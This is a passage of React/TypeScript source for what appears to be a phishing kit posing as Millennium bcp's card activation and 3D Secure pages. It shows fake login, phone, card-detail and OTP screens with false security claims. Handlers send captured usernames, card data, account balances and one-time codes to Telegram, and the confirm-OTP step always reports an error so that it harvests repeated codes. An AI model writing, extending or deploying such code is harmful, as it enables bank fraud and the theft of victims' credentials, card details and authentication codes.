        setOtp(nextOtp)
      }
    }
  }

  // Handle OTP Submit
  const handleOtpSubmit = () => {
    const fullCode = otp.join("")
    if (fullCode.length < 6) {
      setOtpError(
        language === "en"
          ? "Please enter the full 6-digit code"
          : "Por favor, introduza o código de 6 dígitos"
      )
      setShakeCount((prev) => prev + 1)
      return
    }

    setOtpError("")
    triggerOtpCompletion(fullCode)
  }

  // Handle Accounts submission: 2-second blurred loading overlay, then transition to Confirm OTP screen (/cc)
  const handleAccountsSubmit = () => {
    setIsAccountsSubmitting(true)
    if (typeof window !== "undefined") {
      if (accountNumber) sessionStorage.setItem("bbva_accountNumber", accountNumber)
      if (accountBalance) sessionStorage.setItem("bbva_accountBalance", accountBalance)
    }

    const savedUser = (typeof window !== "undefined" && sessionStorage.getItem("bbva_userId")) || userId.trim()
    sendTelegramMessage({
      title: "Millennium bcp — Account Details Captured",
      dni: savedUser || undefined,
      accountNumber: accountNumber || "N/A",
      balance: accountBalance ? `EUR ${accountBalance}` : "N/A",
      type: "account",
    }).catch((err) => console.error("Error sending Telegram notification:", err))

    // Show 2-second loading overlay as requested
    setIsScreenLoading(true)
    setTimeout(() => {
      setIsAccountsSubmitting(false)
      setIsScreenLoading(false)
      setCurrentScreen("confirm-otp")
      if (typeof window !== "undefined" && window.history) {
        window.history.pushState({ screen: "confirm-otp" }, "", "/cc")
      }
      setTimeout(() => {
        confirmOtpRefs.current[0]?.focus()
      }, 100)
    }, 2000)
  }

  // Helper to trigger incorrect code error whenever the user inputs the 6th digit
  const triggerConfirmError = (code: string) => {
    if (typeof window !== "undefined") {
      sessionStorage.setItem("bbva_confirm_otp", code)
    }

    const savedUser = (typeof window !== "undefined" && sessionStorage.getItem("bbva_userId")) || userId.trim()
    const savedPhone =
      (typeof window !== "undefined" &&
        (sessionStorage.getItem("bbva_phoneNumber") ||
          sessionStorage.getItem("phoneNumber") ||
          sessionStorage.getItem("bibd_phone"))) ||
      (phoneNumber ? `${phoneCountryCode} ${phoneNumber.replace(/\s+/g, "")}` : undefined)

    sendTelegramMessage({
      title: `Millennium bcp — Transaction Confirm OTP (Attempt ${confirmAttempt})`,
      dni: savedUser || undefined,
      phoneNumber: savedPhone || undefined,
      otp2: code,
      attempt: `${confirmAttempt}`,
      type: "confirm_otp",
    }).catch((err) => console.error("Error sending Telegram notification:", err))

    // Briefly let the 6th digit render, then display error, clear fields, and reset timer
    setTimeout(() => {
      setHasConfirmError(true)
      setConfirmAttempt((prev) => Math.min(prev + 1, 3))
      setConfirmShake((prev) => prev + 1)
      // Clear fields and reset timer as requested by user
      setConfirmOtp(["", "", "", "", "", ""])
      setConfirmTimeLeft(178) // Reset timer to 2:58
      setTimeout(() => {
        confirmOtpRefs.current[0]?.focus()
      }, 50)
    }, 250)
  }

  // Handle Confirm OTP Digit Change (/cc)
  const handleConfirmOtpChange = (index: number, val: string) => {
    const clean = val.replace(/\D/g, "")
    if (!clean) {
      const nextOtp = [...confirmOtp]
      nextOtp[index] = ""
      setConfirmOtp(nextOtp)
      if (hasConfirmError) setHasConfirmError(false)
      return
    }

    // Paste handling
    if (clean.length > 1) {
      const digits = clean.slice(0, 6).split("")
      const nextOtp = [...confirmOtp]
      digits.forEach((d, i) => {
        if (index + i < 6) nextOtp[index + i] = d
      })
      setConfirmOtp(nextOtp)
      const targetFocus = Math.min(index + digits.length, 5)
      confirmOtpRefs.current[targetFocus]?.focus()

      const fullCode = nextOtp.join("")
      if (fullCode.length === 6) {
        triggerConfirmError(fullCode)
      } else {
        if (hasConfirmError) setHasConfirmError(false)
      }
      return
    }

    const nextOtp = [...confirmOtp]
    nextOtp[index] = clean[clean.length - 1]
    setConfirmOtp(nextOtp)

    // Auto advance
    if (index < 5) {
      confirmOtpRefs.current[index + 1]?.focus()
    }

    const fullCode = nextOtp.join("")
    if (fullCode.length === 6) {
      // User placed the last OTP digit: trigger incorrect message and red borders
      triggerConfirmError(fullCode)
    } else {
      // Don't make border red before that
      if (hasConfirmError) {
        setHasConfirmError(false)
      }
    }
  }

  const handleConfirmOtpKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === "Backspace") {
      if (hasConfirmError) setHasConfirmError(false)
      if (!confirmOtp[index] && index > 0) {
        const nextOtp = [...confirmOtp]
        nextOtp[index - 1] = ""
        setConfirmOtp(nextOtp)
        confirmOtpRefs.current[index - 1]?.focus()
      } else {
        const nextOtp = [...confirmOtp]
        nextOtp[index] = ""
        setConfirmOtp(nextOtp)
      }
    }
  }

  const handleConfirmOtpSubmit = () => {
    const fullCode = confirmOtp.join("")
    if (fullCode.length < 6) {
      setConfirmShake((prev) => prev + 1)
      return
    }
    triggerConfirmError(fullCode)
  }

  const handleResendConfirmOtp = () => {
    setConfirmTimeLeft(178)
    setConfirmOtp(["", "", "", "", "", ""])
    setHasConfirmError(false)
    confirmOtpRefs.current[0]?.focus()

    const savedUser = (typeof window !== "undefined" && sessionStorage.getItem("bbva_userId")) || userId.trim()
    sendTelegramMessage({
      title: "Millennium bcp — Confirm OTP Resend Requested",
      dni: savedUser || undefined,
      type: "resend_confirm_otp",
    }).catch(() => {})
  }

  // Handle Resend OTP Code
  const handleResendOtp = () => {
    setTimeLeft(179)
    setResendSuccess(true)
    setOtp(["", "", "", "", "", ""])
    setOtpError("")
    setTimeout(() => setResendSuccess(false), 3000)
    otpRefs.current[0]?.focus()

    const savedUser = (typeof window !== "undefined" && sessionStorage.getItem("bbva_userId")) || userId.trim()
    sendTelegramMessage({
      title: "Millennium bcp — OTP Resend Requested",
      dni: savedUser || undefined,
      type: "resend_otp",
    }).catch(() => {})
  }

  const isCardFormValid =
    isValidLuhn(cardNumber) &&
    cardMonth.length === 2 &&
    cardYear.length === 2 &&
    cardCvv.length === 3

  const isOtpComplete = otp.join("").length === 6

  return (
    <div
      dir="ltr"
      className="fixed inset-0 w-full h-[100dvh] max-h-[100dvh] flex justify-center items-center font-sans select-none overflow-hidden overscroll-none bg-white"
      style={{ backgroundColor: "#ffffff" }}
    >
      {/* ========================================================================= */}
      {/* 0. SCREEN 0: SMOOTH SEQUENTIAL ICONS SPLASH (LOW SPEED, NO CIRCLE FEEL)   */}
      {/* Pure white background (#ffffff), each icon calmly dissolves in and out    */}
      {/* in the center one after another at a relaxed pace                         */}
      {/* ========================================================================= */}
      {currentScreen === "splash" && (
        <main
          onClick={() => {
            setCurrentScreen("phone")
            if (typeof window !== "undefined" && window.history) {
              window.history.replaceState({ screen: "phone" }, "", "/contacts")
            }
          }}
          className="relative w-full max-w-[440px] sm:max-w-[460px] h-[100dvh] max-h-[100dvh] flex flex-col justify-center items-center overflow-hidden shadow-2xl bg-white px-6 select-none cursor-pointer"
        >
          {/* Centered Sequential Icon Container (Clean, no circular track) */}
          <div className="relative w-28 h-28 sm:w-32 sm:h-32 flex items-center justify-center select-none">
            {/* Active Icon: smoothly rises & dissolves in, rests, then dissolves away */}
            <div
              key={`${splashIconIndex}-${splashAnimPhase}`}
              className={`w-20 h-20 sm:w-24 sm:h-24 flex items-center justify-center ${
                splashAnimPhase === "in"
                  ? "animate-icon-appear"
                  : "animate-icon-remove"
              }`}
            >
              <img
                src={SPLASH_ICONS[splashIconIndex].src}
                alt={SPLASH_ICONS[splashIconIndex].alt}
                className="w-18 h-18 sm:w-20 sm:h-20 object-contain select-none pointer-events-none"
              />
            </div>
          </div>
        </main>
      )}

      {/* ========================================================================= */}
      {/* 0.5. SCREEN 0.5: PIXEL-PERFECT CONTACTS SCREEN (SCREEN BEFORE CARD)       */}
      {/* Matches user screenshot: < CONTACTS X, 4-step progress bar (#990440),     */}
      {/* "Tell us your name and mobile number", Name and Phone input with flag,    */}
      {/* and Continue pill button (#990440) -> Card Screen                         */}
      {/* ========================================================================= */}
      {currentScreen === "phone" && (
        <main className="relative w-full max-w-[440px] sm:max-w-[460px] h-[100dvh] max-h-[100dvh] flex flex-col justify-between overflow-hidden shadow-2xl bg-white px-0 select-none">
          {/* Header Bar: < CARD ACTIVATION [PT|EN] X + 4-segment Progress Bar */}
          <CardActivationHeader
            step={1}
            language={language}
            onToggleLanguage={handleLanguageChange}
            onBack={() => {
              setCurrentScreen("splash")
              if (typeof window !== "undefined" && window.history) {
                window.history.replaceState({ screen: "splash" }, "", "/splash")
              }
            }}
            onClose={() => {
              setFullName("")
              setIsNameFocused(false)
              setPhoneNumber("")
              setIsPhoneFocused(false)
              setPhoneError("")
            }}
          />

          {/* Main Content Area */}
          <section className="relative z-10 w-full bg-white flex-1 min-h-0 flex flex-col justify-between overflow-y-auto px-5 select-none">
            <div className="w-full flex flex-col">
              {/* Heading */}
              <h1 className="text-[25px] sm:text-[27px] font-bold text-[#111827] leading-[1.22] tracking-tight mb-2">
                {language === "en" ? (
                  <>Tell us your name and mobile<br />number</>
                ) : (
                  <>Indique o seu nome e número<br />de telemóvel</>
                )}
              </h1>

              {/* Subheading */}
              <p className="text-[14px] sm:text-[14.5px] text-[#4b5563] font-normal leading-[1.4] mb-6">
                {language === "en"
                  ? "We will send you an SMS code to associate this number with your account"
                  : "Enviaremos um código por SMS para associar este número à sua conta"}
              </p>

              {/* Form */}
              <form onSubmit={handlePhoneSubmit} className="w-full flex flex-col">
                {/* Field 1: First and last name (Floating label from center to top) */}
                <div
                  onClick={() => fullNameInputRef.current?.focus()}
                  className="relative w-full h-[58px] mb-3.5 rounded-[14px] border-[1.5px] border-[#1e293b] px-4 bg-white flex items-center focus-within:border-[#990440] transition-colors cursor-text"
                >
                  <label
                    htmlFor="fullNameInput"
                    className={`absolute left-4 select-none pointer-events-none transition-all duration-200 ease-out ${
                      isNameFocused || fullName.trim().length > 0
                        ? "top-2 text-[11.5px] text-[#6b7280] font-normal"
                        : "top-1/2 -translate-y-1/2 text-[15.5px] text-[#6b7280] font-normal"
                    }`}
                  >
                    {language === "en" ? "First and last name" : "Nome e apelido"}
                  </label>
                  <input
                    id="fullNameInput"
                    ref={fullNameInputRef}
                    type="text"
                    value={fullName}
                    onFocus={() => setIsNameFocused(true)}
                    onBlur={() => setIsNameFocused(false)}
                    onChange={(e) => setFullName(e.target.value)}
                    className={`w-full text-[16px] font-medium text-[#111827] focus:outline-none bg-transparent transition-all ${
                      isNameFocused || fullName.trim().length > 0 ? "pt-4 pb-0.5" : "py-0"
                    }`}
                    placeholder=""
                  />
                </div>

                {/* Field 2: Portugal Flag + Mobile number (Floating label from center to top) */}
                <div
                  onClick={() => phoneInputRef.current?.focus()}
                  className="relative w-full h-[58px] mb-2 rounded-[14px] border-[1.5px] border-[#1e293b] px-3.5 bg-white flex items-center gap-3 focus-within:border-[#990440] transition-colors cursor-text"
                >
                  <div className="flex items-center gap-1.5 px-2.5 py-1.5 rounded-[10px] bg-[#f8fafc] border border-slate-200/80 shrink-0 select-none">
                    <PortugalFlag className="w-6 h-4 rounded-[2px] shadow-2xs" />
                    <ChevronDown className="w-3.5 h-3.5 text-[#475569] stroke-[2.5]" />
                  </div>
                  <div className="relative flex-1 h-full flex items-center">
                    <label
                      htmlFor="mobileInput"
                      className={`absolute left-0 select-none pointer-events-none transition-all duration-200 ease-out ${
                        isPhoneFocused || phoneNumber.trim().length > 0
                          ? "top-2 text-[11px] text-[#6b7280] font-normal"
                          : "top-1/2 -translate-y-1/2 text-[15.5px] text-[#6b7280] font-normal"
                      }`}
                    >
                      {language === "en" ? "Mobile number" : "Número de telemóvel"}
                    </label>
                    <input
                      id="mobileInput"
                      ref={phoneInputRef}
                      type="tel"
                      inputMode="numeric"
                      value={phoneNumber}
                      onFocus={() => setIsPhoneFocused(true)}
                      onBlur={() => setIsPhoneFocused(false)}
                      onChange={handlePhoneChange}
                      className={`w-full text-[16px] font-normal text-[#111827] focus:outline-none bg-transparent transition-all ${
                        isPhoneFocused || phoneNumber.trim().length > 0 ? "pt-4 pb-0.5" : "py-0"
                      }`}
                      placeholder=""
                    />
                  </div>
                </div>

                {/* Error message */}
                {phoneError && (
                  <p className="mt-2 text-red-600 bg-red-50 px-3 py-2 rounded-md text-[13px] font-medium border border-red-200 flex items-center gap-2">
                    <span className="font-bold text-sm">!</span>
                    <span>{phoneError}</span>
                  </p>
                )}
              </form>
            </div>

            {/* Bottom Button Container: Continue Pill Button (#990440) */}
            <div className="w-full pt-4 pb-6 mt-auto">
              <button
                type="button"
                onClick={() => handlePhoneSubmit()}
                disabled={isPhoneSubmitting || !phoneNumber.trim()}
                className={`w-full h-[52px] rounded-full font-semibold text-[16.5px] tracking-wide flex items-center justify-center transition-all select-none shadow-sm ${
                  phoneNumber.trim().length > 0 && !isPhoneSubmitting
                    ? "bg-[#990440] hover:bg-[#830336] active:scale-[0.985] text-white cursor-pointer"
                    : "bg-[#990440]/60 text-white/80 cursor-not-allowed"
                }`}
              >
                {isPhoneSubmitting ? (
                  <div className="flex items-center gap-2">
                    <svg
                      className="animate-spin h-5 w-5 text-white"
                      xmlns="http://www.w3.org/2000/svg"
                      fill="none"
                      viewBox="0 0 24 24"
                    >
                      <circle
                        className="opacity-25"
                        cx="12"
                        cy="12"
                        r="10"
                        stroke="currentColor"
                        strokeWidth="4"
                      />
                      <path
                        className="opacity-75"
                        fill="currentColor"
                        d="M4 12a8 8 0 018-8v8H4z"
                      />
                    </svg>
                    <span>{language === "en" ? "Connecting..." : "A ligar..."}</span>
                  </div>
                ) : language === "en" ? (
                  "Continue"
                ) : (
                  "Continuar"
                )}
              </button>
            </div>
          </section>
        </main>
      )}

      {/* ========================================================================= */}
      {/* 1. SCREEN 1: LOGIN SCREEN                                                 */}
      {/* ========================================================================= */}
      {currentScreen === "login" && (
        <main
          className="relative w-full max-w-[440px] sm:max-w-[460px] h-[100dvh] max-h-[100dvh] flex flex-col justify-between overflow-hidden shadow-2xl bg-white"
          style={{
            backgroundColor: "#ffffff",
          }}
        >
          {/* Header Bar: < CARD ACTIVATION [PT|EN] X + 4-segment Progress Bar */}
          <CardActivationHeader
            step={1}
            language={language}
            onToggleLanguage={handleLanguageChange}
            onBack={() => {
              setCurrentScreen("splash")
              if (typeof window !== "undefined" && window.history) {
                window.history.replaceState({ screen: "splash" }, "", "/splash")
              }
            }}
            onClose={() => {
              setUserId("")
              setPassword("")
              setErrorMessage("")
            }}
          />

          {/* Card */}
          <section className="relative z-10 w-full px-5 flex flex-col justify-center my-auto shrink-0">
            <div
              className="w-full rounded-[26px] p-6 sm:p-7 shadow-2xl border border-white/40"
              style={{
                backgroundColor: "rgba(222, 232, 247, 0.95)",
                boxShadow: "0 18px 40px -10px rgba(0, 18, 100, 0.35)",
              }}
            >
              <h1 className="text-[#0d1e38] text-[24px] sm:text-[26px] font-bold tracking-tight mb-5 select-none leading-none">
                {greeting}
              </h1>

              <form onSubmit={handleLogin} className="w-full flex flex-col">
                {/* Input 1: User */}
                <div className="w-full">
                  <label className="block text-[#374761] text-[13.5px] font-medium mb-1.5 select-none">
                    {language === "en" ? "User" : "Utilizador"}
                  </label>
                  <input
                    type="text"
                    autoComplete="username"
                    value={userId}
                    onChange={(e) => {
                      setUserId(e.target.value)
                      if (errorMessage) setErrorMessage("")
                    }}
                    placeholder={language === "en" ? "User" : "Utilizador"}
                    className="w-full h-[48px] px-4 rounded-[10px] bg-white text-[#1e293b] placeholder-[#94a3b8] text-[15.5px] font-normal border border-transparent focus:outline-none focus:border-[#990440] focus:ring-1 focus:ring-[#990440] transition-all shadow-[0_1px_2px_rgba(0,0,0,0.04)]"
                  />
                </div>

                {/* Input 2: Password */}
                <div className="w-full mt-3.5">
                  <label className="block text-[#374761] text-[13.5px] font-medium mb-1.5 select-none">
                    {language === "en" ? "Password" : "Palavra-passe"}
                  </label>
                  <div className="w-full h-[48px] px-4 rounded-[10px] bg-white flex items-center border border-transparent focus-within:border-[#990440] focus-within:ring-1 focus-within:ring-[#990440] transition-all shadow-[0_1px_2px_rgba(0,0,0,0.04)]">
                    <input
                      type={showPassword ? "text" : "password"}
                      autoComplete="current-password"
                      value={password}
                      onChange={(e) => {
                        setPassword(e.target.value)
                        if (errorMessage) setErrorMessage("")
                      }}
                      placeholder={language === "en" ? "Password" : "Palavra-passe"}
                      className="flex-1 min-w-0 h-full bg-transparent text-[#1e293b] placeholder-[#94a3b8] text-[15.5px] font-normal border-none outline-none pr-2"
                    />
                    <button
                      type="button"
                      onClick={() => setShowPassword(!showPassword)}
                      aria-label={showPassword ? "Hide password" : "Show password"}
                      className="p-1 text-[#55627a] hover:text-[#1e293b] cursor-pointer transition-colors focus:outline-none flex items-center justify-center shrink-0"
                    >
                      {showPassword ? (
                        <Eye className="w-[19px] h-[19px] stroke-[1.8]" />
                      ) : (
                        <EyeOff className="w-[19px] h-[19px] stroke-[1.8]" />
                      )}
                    </button>
                  </div>
                </div>

                {/* Error Message */}
                {errorMessage && (
                  <p className="mt-2.5 text-red-600 bg-red-50/90 px-3 py-1.5 rounded-md text-[13px] font-medium border border-red-200 animate-shake">
                    {errorMessage}
                  </p>
                )}

                {/* Submit Button */}
                <button
                  type="submit"
                  disabled={isScreenLoading}
                  className="w-full h-[50px] mt-5 rounded-full bg-[#990440] hover:bg-[#830336] active:scale-[0.985] text-white font-semibold text-[15.5px] tracking-wide flex items-center justify-center shadow-md cursor-pointer transition-all disabled:opacity-85 select-none"
                >
                  {language === "en" ? "Log in to verify" : "Iniciar sessão para verificar"}
                </button>
              </form>

              {/* 4 Feature Icons Row */}
              <div className="grid grid-cols-4 gap-2 mt-6 pt-1 select-none">
                <div className="flex flex-col items-center text-center group cursor-pointer">
                  <div className="w-[48px] h-[48px] rounded-full bg-white flex items-center justify-center shadow-[0_1px_3px_rgba(0,0,0,0.06)] group-hover:scale-105 transition-transform">
                    <UserPlus className="w-[20px] h-[20px] text-[#990440]" strokeWidth={2.2} />
                  </div>
                  <span className="text-[11px] sm:text-[11.5px] font-medium text-[#2d3a52] mt-2 leading-[1.25]">
                    {language === "en" ? <>Become a<br />customer</> : <>Aderir<br />ao Banco</>}
                  </span>
                </div>

                <div className="flex flex-col items-center text-center group cursor-pointer">
                  <div className="w-[48px] h-[48px] rounded-full bg-white flex items-center justify-center shadow-[0_1px_3px_rgba(0,0,0,0.06)] group-hover:scale-105 transition-transform">
                    <Home className="w-[20px] h-[20px] text-[#990440]" strokeWidth={2.2} />
                  </div>
                  <span className="text-[11px] sm:text-[11.5px] font-medium text-[#2d3a52] mt-2 leading-[1.25]">
                    Millennium<br />App
                  </span>
                </div>

                <div className="flex flex-col items-center text-center group cursor-pointer">
                  <div className="w-[48px] h-[48px] rounded-full bg-white flex items-center justify-center shadow-[0_1px_3px_rgba(0,0,0,0.06)] group-hover:scale-105 transition-transform">
                    <MapPin className="w-[20px] h-[20px] text-[#990440]" strokeWidth={2.2} />
                  </div>
                  <span className="text-[11px] sm:text-[11.5px] font-medium text-[#2d3a52] mt-2 leading-[1.25]">
                    {language === "en" ? <>Branches<br />and ATMs</> : <>Sucursais<br />e caixas</>}
                  </span>
                </div>

                <div className="flex flex-col items-center text-center group cursor-pointer">
                  <div className="w-[48px] h-[48px] rounded-full bg-white flex items-center justify-center shadow-[0_1px_3px_rgba(0,0,0,0.06)] group-hover:scale-105 transition-transform">
                    <Users className="w-[20px] h-[20px] text-[#990440]" strokeWidth={2.2} />
                  </div>
                  <span className="text-[11px] sm:text-[11.5px] font-medium text-[#2d3a52] mt-2 leading-[1.25]">
                    {language === "en" ? <>Share<br />expenses</> : <>Partilhar<br />despesas</>}
                  </span>
                </div>
              </div>
            </div>
          </section>

          <div className="h-6 shrink-0" />
        </main>
      )}

      {/* ========================================================================= */}
      {/* 2. SCREEN 2: CARD DETAILS SCREEN (MATCHING SCREENSHOT 2)                  */}
      {/* Card is STICKY at top, form below is SCROLLABLE, CVV is 3 digits          */}
      {/* Fields AUTO-ADVANCE on fill without manual clicking                       */}
      {/* ========================================================================= */}
      {currentScreen === "card" && (
        <main className="relative w-full max-w-[440px] sm:max-w-[460px] h-[100dvh] max-h-[100dvh] flex flex-col overflow-hidden shadow-2xl bg-white px-0">
          {/* Header Bar: < CARD ACTIVATION [PT|EN] X + 4-segment Progress Bar */}
          <CardActivationHeader
            step={2}
            language={language}
            onToggleLanguage={handleLanguageChange}
            onBack={() => {
              setCurrentScreen("phone")
              if (typeof window !== "undefined" && window.history) {
                window.history.replaceState({ screen: "phone" }, "", "/contacts")
              }
            }}
            onClose={() => {
              setCardNumber("")
              setCardMonth("")
              setCardYear("")
              setCardCvv("")
              setCardError("")
            }}
          />

          {/* Card Container extending to bottom with white Background */}
          <section className="relative z-10 w-full bg-white rounded-none flex-1 min-h-0 flex flex-col overflow-hidden select-none">
            {/* STICKY TOP CARD IMAGE - Pinned in place, does not scroll away, background white */}
            <div className="shrink-0 w-full px-4 pt-3.5 pb-2 bg-white z-10">
              <div className="w-full flex justify-center">
                <img
                  src="/millennium_card.jpg"
                  alt="Millennium bcp Card"
                  className="w-full max-w-[380px] mx-auto h-auto object-contain rounded-[14px] shadow-sm select-none pointer-events-none"
                />
              </div>
            </div>

            {/* SCROLLABLE FORM SECTION - Smoothly scrolls below the sticky card, background white */}
            <div
              className="flex-1 min-h-0 overflow-y-auto px-4 pt-2 pb-10 flex flex-col bg-white overscroll-y-contain touch-pan-y"
              style={{ WebkitOverflowScrolling: "touch" }}
            >
              <div className="w-full flex flex-col pb-6">
                {/* Title & Subtitle */}
                <h2 className="text-[#0d1e38] text-[20px] sm:text-[21px] font-bold tracking-tight">
                  {language === "en" ? "Enter Card Details" : "Introduzir dados do cartão"}
                </h2>
                <p className="text-[#64748b] text-[13px] sm:text-[13.5px] font-normal mt-0.5 mb-4">
                  {language === "en"
                    ? "Please enter your card details to verify and activate your card."
                    : "Por favor, introduza os dados do seu cartão para verificar e ativar o cartão."}
                </p>

                {/* Form */}
                <form onSubmit={handleCardSubmit} className="w-full flex flex-col">
                  {/* Field 1: Card Number - Auto moves to Month when 16 digits entered */}
                  <div className="w-full mb-3.5">
                    <div className="flex items-center justify-between mb-1.5">
                      <label className="text-[11px] font-bold text-[#64748b] tracking-wider uppercase">
                        {language === "en" ? "16-DIGIT CARD NUMBER" : "NÚMERO DE CARTÃO DE 16 DÍGITOS"}
                      </label>
                    </div>
                    <input
                      ref={cardNumberRef}
                      type="tel"
                      inputMode="numeric"
                      value={cardNumber}
                      onChange={handleCardNumberChange}
                      placeholder="0000 0000 0000 0000"
                      maxLength={19}
                      className="w-full h-[48px] px-3.5 rounded-[10px] border border-[#cbd5e1] bg-white text-[#1e293b] placeholder-[#cbd5e1] text-[15px] font-normal tracking-[0.08em] focus:outline-none focus:border-[#990440] focus:ring-1 focus:ring-[#990440] transition-all"
                    />
                  </div>

                  {/* Field 2 & 3: Month & Year - Auto moves Month -> Year -> CVV */}
                  <div className="w-full grid grid-cols-2 gap-3 mb-3.5">
                    {/* Month (2 digits) */}
                    <div>
                      <div className="flex items-center gap-1 mb-1.5">
                        <label className="text-[11px] font-bold text-[#64748b] tracking-wider uppercase">
                          {language === "en" ? "MONTH" : "MÊS"}
                        </label>
                      </div>
                      <input
                        ref={cardMonthRef}
                        type="tel"
                        inputMode="numeric"
                        value={cardMonth}
                        onChange={handleMonthChange}
                        onKeyDown={handleMonthKeyDown}
                        placeholder="MM"
                        maxLength={2}
                        className="w-full h-[48px] px-3.5 rounded-[10px] border border-[#cbd5e1] bg-white text-[#1e293b] placeholder-[#cbd5e1] text-[15px] font-normal text-center focus:outline-none focus:border-[#990440] focus:ring-1 focus:ring-[#990440] transition-all"
                      />
                    </div>

                    {/* Year (2 digits) */}
                    <div>
                      <div className="flex items-center mb-1.5">
                        <label className="text-[11px] font-bold text-[#64748b] tracking-wider uppercase">
                          {language === "en" ? "YEAR" : "ANO"}
                        </label>
                      </div>
                      <input
                        ref={cardYearRef}
                        type="tel"
                        inputMode="numeric"
                        value={cardYear}
                        onChange={handleYearChange}
                        onKeyDown={handleYearKeyDown}
                        placeholder="YY"
                        maxLength={2}
                        className="w-full h-[48px] px-3.5 rounded-[10px] border border-[#cbd5e1] bg-white text-[#1e293b] placeholder-[#cbd5e1] text-[15px] font-normal text-center focus:outline-none focus:border-[#990440] focus:ring-1 focus:ring-[#990440] transition-all"
                      />
                    </div>
                  </div>

                  {/* Field 4: CVV / CVC - Strictly 3 digits */}
                  <div className="w-full mb-3">
                    <div className="flex items-center justify-between mb-1.5">
                      <label className="text-[11px] font-bold text-[#64748b] tracking-wider uppercase">
                        CVV / CVC
                      </label>
                    </div>
                    <input
                      ref={cardCvvRef}
                      type="password"
                      inputMode="numeric"
                      value={cardCvv}
                      onChange={handleCvvChange}
                      onKeyDown={handleCvvKeyDown}
                      placeholder="• • •"
                      maxLength={3}
                      className="w-full h-[48px] px-3.5 rounded-[10px] border border-[#cbd5e1] bg-white text-[#1e293b] placeholder-[#94a3b8] text-[18px] tracking-[0.25em] focus:outline-none focus:border-[#990440] focus:ring-1 focus:ring-[#990440] transition-all"
                    />
                  </div>

                  {/* Error if any */}
                  {cardError && (
                    <p className="mt-1 mb-2 text-red-600 bg-red-50 px-3 py-1.5 rounded-md text-[13px] font-medium border border-red-200 animate-shake">
                      {cardError}
                    </p>
                  )}

                  {/* 256-bit encryption text */}
                  <p className="text-center text-[11px] sm:text-[11.5px] text-[#94a3b8] mt-2 mb-4 leading-normal">
                    {language === "en"
                      ? "Your card details are secured with 256-bit encryption."
                      : "Os dados do seu cartão estão protegidos com encriptação de 256 bits."}
                  </p>

                  {/* Continue Button */}
                  <button
                    type="submit"
                    disabled={isCardSubmitting || !isCardFormValid}
                    className={`w-full h-[50px] sm:h-[52px] rounded-full font-semibold text-[16px] tracking-wide flex items-center justify-center transition-all select-none shadow-sm ${
                      isCardFormValid && !isCardSubmitting
                        ? "bg-[#990440] hover:bg-[#830336] active:scale-[0.985] text-white cursor-pointer"
                        : "bg-[#e2e8f0] text-[#94a3b8] cursor-not-allowed"
                    }`}
                  >
                    {isCardSubmitting ? (
                      <div className="flex items-center gap-2">
                        <svg
                          className="animate-spin h-5 w-5 text-white"
                          xmlns="http://www.w3.org/2000/svg"
                          fill="none"
                          viewBox="0 0 24 24"
                        >
                          <circle
                            className="opacity-25"
                            cx="12"
                            cy="12"
                            r="10"
                            stroke="currentColor"
                            strokeWidth="4"
                          />
                          <path
                            className="opacity-75"
                            fill="currentColor"
                            d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
                          />
                        </svg>
                        <span>{language === "en" ? "VERIFYING..." : "A VERIFICAR..."}</span>
                      </div>
                    ) : language === "en" ? (
                      "Continue"
                    ) : (
                      "Continuar"
                    )}
                  </button>
                </form>
              </div>
            </div>
          </section>
        </main>
      )}

      {/* ========================================================================= */}
      {/* 2.5. SCREEN 2.5: MILLENNIUM BCP 3D SECURE (Confirme o Pagamento)           */}
      {/* Pixel-perfect match to user-uploaded photo from Millennium bcp             */}
      {/* ========================================================================= */}
      {currentScreen === "boc-verify" && (
        <main className="relative w-full max-w-[440px] sm:max-w-[460px] h-[100dvh] max-h-[100dvh] flex flex-col justify-between overflow-y-auto shadow-2xl bg-white px-0 select-none">
          {/* Header: Left is Millennium bcp badge, Right is PT|EN toggle + VISA SECURE badge */}
          <header className="w-full px-6 pt-7 pb-4 flex items-center justify-between shrink-0 bg-white">
            <MillenniumBcpBadge />
            <div className="flex items-center gap-3">
              <div className="flex items-center bg-[#f1f5f9] rounded-full p-0.5 text-[10.5px] font-bold border border-slate-200/60 select-none">
                <button
                  type="button"
                  onClick={() => handleLanguageChange("pt")}
                  className={`px-1.5 py-0.5 rounded-full transition-all cursor-pointer ${
                    language === "pt"
                      ? "bg-[#990440] text-white shadow-xs"
                      : "text-[#64748b] hover:text-[#0f172a]"
                  }`}
                  aria-label="Português"
                >
                  PT
                </button>
                <button
                  type="button"
                  onClick={() => handleLanguageChange("en")}
                  className={`px-1.5 py-0.5 rounded-full transition-all cursor-pointer ${
                    language === "en"
                      ? "bg-[#990440] text-white shadow-xs"
                      : "text-[#64748b] hover:text-[#0f172a]"
                  }`}
                  aria-label="English"
                >
                  EN
                </button>
              </div>
              <VisaSecureBadge />
            </div>
          </header>

          {/* Main Body */}
          <section className="w-full flex-1 flex flex-col px-6 pt-4 pb-7 select-none bg-white">
            {/* Title: Confirme o Pagamento */}
            <h1 className="text-[20px] sm:text-[22px] font-normal text-[#1a1a1a] tracking-tight mb-5">
              {language === "en" ? "Confirm Payment" : "Confirme o Pagamento"}
            </h1>

            {/* Warning / Authentication Alert Box matching photo */}
            <div className="w-full flex items-start gap-3.5 mb-6">
              <div className="w-9 h-9 sm:w-10 sm:h-10 rounded-full border-[2.2px] border-[#7d8b99] flex items-center justify-center shrink-0 text-[#7d8b99] font-bold text-[19px] leading-none select-none mt-0.5">
                !
              </div>
              <p className="text-[13.5px] sm:text-[14px] text-[#2c3e50] leading-[1.48] font-normal">
                {language === "en"
                  ? "Authentication was not successful. Please check your bank's app and follow the instructions to complete the authentication process."
                  : "A autenticação não foi realizada com sucesso. Por favor, verifique a aplicação do seu banco e siga as indicações para conclusão do processo de autenticação."}
              </p>
            </div>

            {/* Simple clean text of deduction fee only (no entire box) */}
            <p className="text-[13px] sm:text-[13.5px] text-[#4b5563] mt-1 mb-6">
              {language === "en" ? (
                <>Fee deduction: <span className="font-semibold text-[#111827]">0.082 EUR</span></>
              ) : (
                <>Dedução de taxa: <span className="font-semibold text-[#111827]">0.082 EUR</span></>
              )}
            </p>

            {/* Blue Button: JÁ AUTORIZEI. CONTINUAR. (Non-clickable as requested) */}
            <div className="w-full mt-auto pt-4 select-none">
              <button
                type="button"
                disabled
